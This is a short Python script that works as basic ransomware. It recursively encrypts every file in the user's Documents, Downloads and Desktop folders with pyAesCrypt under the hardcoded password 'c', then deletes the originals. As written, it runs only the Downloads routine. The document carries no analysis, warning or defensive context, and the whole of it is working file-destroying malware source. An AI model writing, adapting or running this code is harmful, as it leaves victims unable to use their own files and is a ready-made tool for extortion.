import pyAesCrypt
import glob
import os
import getpass
username = getpass.getuser()
bufferSize = 64 * 1024
curDir = os.getcwd()
password1 = 'c'
def enc():
    for x in glob.glob('Docments\\**\*', recursive=True):
        fullpath = os.path.join(curDir, x)
        fullnewf = os.path.join(curDir, x + '.aes')
        if os.path.isfile(fullpath):
            pyAesCrypt.encryptFile(fullpath, fullnewf, password1, bufferSize)
            os.remove(fullpath)
def enc2():
    for x in glob.glob('Downloads\\**\*', recursive=True):
        fullpath = os.path.join(curDir, x)
        fullnewf = os.path.join(curDir, x + '.aes')
        if os.path.isfile(fullpath):
            pyAesCrypt.encryptFile(fullpath, fullnewf, password1, bufferSize)
            os.remove(fullpath)
def enc3():
    for x in glob.glob('Desktop\\**\*', recursive=True):
        fullpath = os.path.join(curDir, x)
        fullnewf = os.path.join(curDir, x + '.aes')
        if os.path.isfile(fullpath):
            pyAesCrypt.encryptFile(fullpath, fullnewf, password1, bufferSize)
            os.remove(fullpath)


enc2()
